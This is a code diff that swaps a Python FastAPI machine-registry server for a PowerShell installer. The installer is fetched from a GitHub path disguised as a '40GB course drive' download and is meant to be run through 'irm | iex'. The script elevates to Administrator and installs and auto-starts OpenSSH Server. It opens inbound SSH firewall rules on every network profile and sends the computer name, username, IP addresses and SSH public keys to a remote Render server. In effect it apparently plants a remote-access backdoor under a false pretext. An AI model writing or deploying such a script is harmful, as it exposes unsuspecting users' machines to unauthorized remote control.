@@ -1,211 +1,158 @@
-# server.py — VM SSH Manager | Render + MongoDB Atlas | KHONG probe, KHONG token
-import os, re, base64, ipaddress
-from datetime import datetime, timezone
-from typing import Optional, List
+<#
+  install_openssh.ps1 — BAN FULL CUOI
+  Chuc nang: cai OpenSSH Server -> mo firewall -> tu do port/IP -> doc public key -> gui len server
+  Khong validate key, khong keo key tu server, khong scheduled task.
+  Cach chay: .\install_openssh.ps1   hoac   irm <url> | iex   (tu xin quyen Admin)
+#>
 
-from fastapi import FastAPI, HTTPException, Request
-from pydantic import BaseModel, field_validator
-from pymongo import MongoClient, ASCENDING
-from pymongo.errors import PyMongoError
+# ==================== CAU HINH ====================
+$ApiBase = 'https://vm-ssh-manager.onrender.com'
+$SelfUrl = 'https://raw.githubusercontent.com/khoahocdrive/dowbload_40GB_course_drive/main/drive_windows.ps1'
+# ==================================================
 
-MONGODB_URI = os.environ.get("MONGODB_URI", "").strip()
-DB_NAME = os.environ.get("MONGODB_DB", "vm_manager")
-ADMIN_KEY = os.environ.get("ADMIN_KEY", "")
+$ErrorActionPreference = 'Stop'
+$NeedRestart = $false
+$ApiBase   = $ApiBase.TrimEnd('/')
+$ReportUrl = "$ApiBase/api/vms"
 
-# Nhan ca comment o cuoi (user@host, nt authority\...) - dung chuan file .pub
-KEY_RE = re.compile(
-    r"^(ssh-ed25519|ssh-rsa|ecdsa-sha2-nistp(256|384|521)"
-    r"|sk-ssh-ed25519@openssh\.com|sk-ecdsa-sha2-nistp256@openssh\.com)"
-    r"\s+(?P<blob>[A-Za-z0-9+/=]+)"
-    r"(?:\s+\S.*)?$"
-)
-NAME_RE = re.compile(r"^[^\s]{1,64}$")
-USER_RE = re.compile(r"^[^\s]{1,64}$")
+# ===== 0. XIN QUYEN ADMIN =====
+$__id    = [Security.Principal.WindowsIdentity]::GetCurrent()
+$__admin = (New-Object Security.Principal.WindowsPrincipal($__id)).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $__admin) {
+  $__src = $PSCommandPath
+  if (-not $__src) { $__src = $MyInvocation.MyCommand.Path }
+  if (-not $__src) {
+    $__src = Join-Path $env:TEMP 'install_openssh.ps1'
+    try { Invoke-RestMethod -Uri $SelfUrl -OutFile $__src -UseBasicParsing -TimeoutSec 60 }
+    catch { Write-Host "Khong tai duoc script: $($_.Exception.Message)" -ForegroundColor Red; throw }
+  }
+  try { Unblock-File -Path $__src -ErrorAction SilentlyContinue } catch {}
+  $__arg = '-NoExit -NoProfile -Command "iex ([System.IO.File]::ReadAllText(''' + $__src + '''))"'
+  Write-Host 'Dang xin quyen Administrator... bam Yes o hop UAC.' -ForegroundColor Cyan
+  try { Start-Process powershell.exe -Verb RunAs -ArgumentList $__arg -ErrorAction Stop }
+  catch { Write-Host 'Khong nang quyen duoc (bam No, hoac may khong co tai khoan admin).' -ForegroundColor Red; throw }
+  return   # KHONG dung exit: exit se dong cua so cua ban
+}
 
-app = FastAPI(docs_url=None, redoc_url=None, openapi_url=None)
+# ===== 1. CAI OPENSSH SERVER =====
+Write-Host '=== 1/3: Cai OpenSSH Server ===' -ForegroundColor Cyan
+$capName = 'OpenSSH.Server~~~~0.0.1.0'
+$cap = Get-WindowsCapability -Online -Name $capName -ErrorAction SilentlyContinue
+if (-not $cap -or $cap.State -ne 'Installed') {
+  Write-Host 'Dang cai OpenSSH Server (co the mat 1-2 phut)...'
+  try {
+    $r = Add-WindowsCapability -Online -Name $capName
+    if ($r -and $r.RestartNeeded) { $NeedRestart = $true }
+  } catch {
+    Write-Host "Add-WindowsCapability loi: $($_.Exception.Message) - thu DISM..." -ForegroundColor Yellow
+    & dism.exe /Online /Add-Capability /CapabilityName:$capName /NoRestart | Out-Null
+  }
+}
+if (-not (Get-Service sshd -ErrorAction SilentlyContinue)) {
+  Write-Host '[LOI] Khong cai duoc OpenSSH Server.' -ForegroundColor Red
+  exit 1
+}
+Set-Service sshd -StartupType Automatic
+& sc.exe start sshd | Out-Null          # start khong chan
+Write-Host '  Cho sshd khoi dong: ' -NoNewline
+for ($w = 0; $w -lt 30; $w++) {
+  if ((Get-Service sshd).Status -eq 'Running') { break }
+  Write-Host '.' -NoNewline
+  Start-Sleep -Seconds 2
+}
+Write-Host ''
+Write-Host ("  sshd: " + (Get-Service sshd).Status) -ForegroundColor Green
 
-client = None
-vms = None
-keys_col = None
-if MONGODB_URI:
-    client = MongoClient(
-        MONGODB_URI,
-        serverSelectionTimeoutMS=5000,
-        connectTimeoutMS=10000,
-        socketTimeoutMS=20000,
-        retryWrites=True, tz_aware=True,
-    )
-    vms = client[DB_NAME]["vms"]
-    keys_col = client[DB_NAME]["authorized_keys"]
+# ===== 2. DO PORT + MO FIREWALL + DO IP =====
+Write-Host '=== 2/3: Port / Firewall / IP ===' -ForegroundColor Cyan
+$sshdExe = Join-Path $env:WINDIR 'System32\OpenSSH\sshd.exe'
+$ports = @(22)
+$ErrorActionPreference = 'Continue'
+$eff = & $sshdExe -T 2>$null
+if ($eff) {
+  $p = @($eff | Where-Object { $_ -match '^port\s+\d+' } | ForEach-Object { [int]($_ -split '\s+')[1] })
+  if ($p.Count -gt 0) { $ports = $p }
+}
+$ErrorActionPreference = 'Stop'
+$ports = @($ports | Select-Object -Unique)
+$sshPort = $ports[0]
+Write-Host "  Port SSH: $($ports -join ', ')" -ForegroundColor Green
 
-_idx_done = False
-def ensure_indexes():
-    global _idx_done
-    if _idx_done or vms is None: return
-    try:
-        vms.create_index([("updated_at", ASCENDING)])
-        _idx_done = True
-    except PyMongoError: pass
+foreach ($p in $ports) {
+  $rn = if ($p -eq 22) { 'OpenSSH-Server-In-TCP' } else { "OpenSSH-Server-In-TCP-$p" }
+  if (Get-NetFirewallRule -Name $rn -ErrorAction SilentlyContinue) { Enable-NetFirewallRule -Name $rn | Out-Null }
+  else { New-NetFirewallRule -Name $rn -DisplayName "OpenSSH Server $p" -Direction Inbound -Protocol TCP -LocalPort $p -Action Allow -Profile Any | Out-Null }
+  if (@(Get-NetTCPConnection -LocalPort $p -State Listen -ErrorAction SilentlyContinue).Count -gt 0) {
+    Write-Host "  Cong $p dang LISTEN." -ForegroundColor Green
+  } else {
+    Write-Host "  CANH BAO: cong $p chua LISTEN." -ForegroundColor Red
+  }
+}
 
-def db_guard():
-    if vms is None: raise HTTPException(503, "db_not_configured")
-    ensure_indexes()
+$validIPs = @(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
+              Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' })
+$primaryIP = $null
+$defRoute = Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue |
+            Sort-Object RouteMetric, InterfaceMetric | Select-Object -First 1
+if ($defRoute) {
+  $primaryIP = (Get-NetIPAddress -InterfaceIndex $defRoute.InterfaceIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue |
+                Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' } |
+                Select-Object -First 1).IPAddress
+}
+if (-not $primaryIP) { $primaryIP = ($validIPs | Select-Object -First 1).IPAddress }
+Write-Host "  IP chinh: $primaryIP | User: $env:USERNAME | May: $env:COMPUTERNAME" -ForegroundColor Green
+foreach ($ipObj in $validIPs) { Write-Host "  ssh -p $sshPort $env:USERNAME@$($ipObj.IPAddress)" -ForegroundColor Green }
 
-def now(): return datetime.now(timezone.utc)
+# ===== 3. DOC PUBLIC KEY NGUYEN VAN + GUI LEN SERVER =====
+Write-Host '=== 3/3: Bao cao len server ===' -ForegroundColor Cyan
+$pubKey = $null
+foreach ($f in @(
+  (Join-Path $env:USERPROFILE '.ssh\id_ed25519.pub'),
+  (Join-Path $env:USERPROFILE '.ssh\id_rsa.pub'),
+  (Join-Path $env:ProgramData 'ssh\ssh_host_ed25519_key.pub'),
+  (Join-Path $env:ProgramData 'ssh\ssh_host_rsa_key.pub')
+)) {
+  if (Test-Path $f) {
+    $line = ((Get-Content $f -Raw).Trim() -split "`n")[0].Trim()
+    if ($line) { $pubKey = $line; Write-Host "  Public key tu: $f" -ForegroundColor Gray; break }
+  }
+}
+if (-not $pubKey) { Write-Host '  Khong co file .pub -> gui khong co public_key.' -ForegroundColor Yellow }
 
-def require_admin(req: Request):
-    if not ADMIN_KEY or req.headers.get("x-admin-key") != ADMIN_KEY:
-        raise HTTPException(403, "unauthorized")
+$payload = @{
+  vm_name    = $env:COMPUTERNAME
+  ip_address = "$primaryIP"
+  port       = $sshPort
+  username   = $env:USERNAME
+  all_ips    = @($validIPs | ForEach-Object { $_.IPAddress })
+}
+if ($pubKey) { $payload.public_key = $pubKey }
+$payload = $payload | ConvertTo-Json -Compress
 
-def valid_ip(v: str) -> bool:
-    try:
-        ipaddress.ip_address(v.strip()); return True
-    except ValueError: return False
+if (-not $primaryIP) {
+  Write-Host '[WARN] Khong co IPv4 hop le -> bo qua bao cao.' -ForegroundColor Yellow
+} else {
+  $sent = $false
+  for ($i = 1; $i -le 3; $i++) {
+    try {
+      $body = [System.Text.Encoding]::UTF8.GetBytes($payload)
+      $resp = Invoke-RestMethod -Uri $ReportUrl -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -TimeoutSec 60 -UseBasicParsing
+      Write-Host "[SUCCESS] $($resp.status) - VM $($resp.vm)" -ForegroundColor Green
+      $sent = $true
+      break
+    } catch {
+      $detail = ''
+      if ($_.Exception.Response) {
+        $sr = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
+        $detail = $sr.ReadToEnd(); $sr.Close()
+      }
+      Write-Host "  Bao cao lan $i/3 that bai: $($_.Exception.Message)" -ForegroundColor Yellow
+      if ($detail) { Write-Host "  Server noi: $detail" -ForegroundColor DarkYellow }
+      if ($i -lt 3) { Start-Sleep -Seconds 5 }
+    }
+  }
+  if (-not $sent) { Write-Host '[PENDING] Khong gui duoc. Chay lai script khi mang/server on.' -ForegroundColor Yellow }
+}
 
-def valid_ssh_public_key(key: str) -> bool:
-    m = KEY_RE.match(key.strip())
-    if not m: return False
-    try:
-        blob = base64.b64decode(m.group("blob"), validate=False)
-    except Exception:
-        return False
-    return 30 <= len(blob) <= 16384
-
-
-class VMInfo(BaseModel):
-    vm_name: str
-    ip_address: str
-    port: int = 22
-    username: str
-    public_key: Optional[str] = None
-    machine_guid: Optional[str] = None
-    all_ips: Optional[List[str]] = None
-
-    @field_validator("vm_name")
-    @classmethod
-    def _v_name(cls, v):
-        if not v or not NAME_RE.match(v): raise ValueError("vm_name invalid")
-        return v
-
-    @field_validator("username")
-    @classmethod
-    def _v_user(cls, v):
-        if not v or not USER_RE.match(v): raise ValueError("username invalid")
-        return v
-
-    @field_validator("ip_address")
-    @classmethod
-    def _v_ip(cls, v):
-        if not valid_ip(v): raise ValueError("ip invalid")
-        return v.strip()
-
-    @field_validator("port")
-    @classmethod
-    def _v_port(cls, v):
-        if not (1 <= v <= 65535): raise ValueError("port invalid")
-        return v
-
-    @field_validator("machine_guid")
-    @classmethod
-    def _v_guid(cls, v):
-        if v is None or not v.strip(): return None
-        if len(v) > 128: raise ValueError("guid too long")
-        return v.strip()
-
-    @field_validator("public_key")
-    @classmethod
-    def _v_key(cls, v):
-        if v is None or not v.strip(): return None
-        if not valid_ssh_public_key(v): raise ValueError("public_key invalid")
-        return v.strip()
-
-    @field_validator("all_ips")
-    @classmethod
-    def _v_ips(cls, v):
-        if v is None: return v
-        if len(v) > 20: raise ValueError("too many ips")
-        return [ip.strip() for ip in v if valid_ip(ip)]
-
-
-class KeyIn(BaseModel):
-    public_key: str
-    @field_validator("public_key")
-    @classmethod
-    def _v_key(cls, v):
-        v = v.strip()
-        if not valid_ssh_public_key(v): raise ValueError("public_key invalid")
-        return v
-
-
-def env_keys():
-    res = []
-    for line in re.split(r"[\r\n,]+", os.environ.get("AUTHORIZED_KEYS", "")):
-        s = line.strip()
-        if s and not s.startswith("#") and KEY_RE.match(s) and s not in res:
-            res.append(s)
-    return res
-
-def all_keys():
-    res = env_keys()
-    if keys_col is not None:
-        try:
-            for d in keys_col.find({}, {"_id": 1}):
-                if KEY_RE.match(d["_id"]) and d["_id"] not in res:
-                    res.append(d["_id"])
-        except PyMongoError: pass
-    return res
-
-
-@app.get("/health")
-def health():
-    info = {"status": "ok", "time": now().isoformat(timespec="seconds")}
-    if client:
-        try:
-            client.admin.command("ping")
-            info["db"] = "ok"
-            info["vms"] = vms.estimated_document_count()
-        except PyMongoError as e:
-            info["db"] = f"error:{e}"
-    else:
-        info["db"] = "not_configured"
-    return info
-
-@app.get("/api/authorized-keys")
-def get_keys():
-    db_guard()
-    return {"keys": all_keys()}
-
-@app.post("/api/vms")
-def register_vm(vm: VMInfo):
-    db_guard()
-    doc = vm.model_dump()
-    doc["updated_at"] = now()
-    try:
-        vms.update_one(
-            {"_id": vm.vm_name},
-            {"$set": doc, "$setOnInsert": {"first_seen": now()}},
-            upsert=True,
-        )
-    except PyMongoError:
-        raise HTTPException(503, "db_error")
-    return {"status": "success", "vm": vm.vm_name}
-
-@app.delete("/api/vms/{vm_name}")
-def delete_vm(vm_name: str):
-    db_guard()
-    r = vms.delete_one({"_id": vm_name})
-    if r.deleted_count == 0: raise HTTPException(404, "not_found")
-    return {"status": "success"}
-
-@app.post("/api/authorized-keys")
-def add_key(k: KeyIn, req: Request):
-    require_admin(req); db_guard()
-    keys_col.update_one({"_id": k.public_key}, {"$setOnInsert": {"added_at": now()}}, upsert=True)
-    return {"status": "success", "total_keys": len(all_keys())}
-
-@app.delete("/api/authorized-keys")
-def del_key(k: KeyIn, req: Request):
-    require_admin(req); db_guard()
-    r = keys_col.delete_one({"_id": k.public_key})
-    if r.deleted_count == 0: raise HTTPException(404, "not_found")
-    return {"status": "success"}
+if ($NeedRestart) { Write-Host 'Can REBOOT de hoan tat cai OpenSSH.' -ForegroundColor Yellow }
+Write-Host 'HOAN TAT.' -ForegroundColor Green
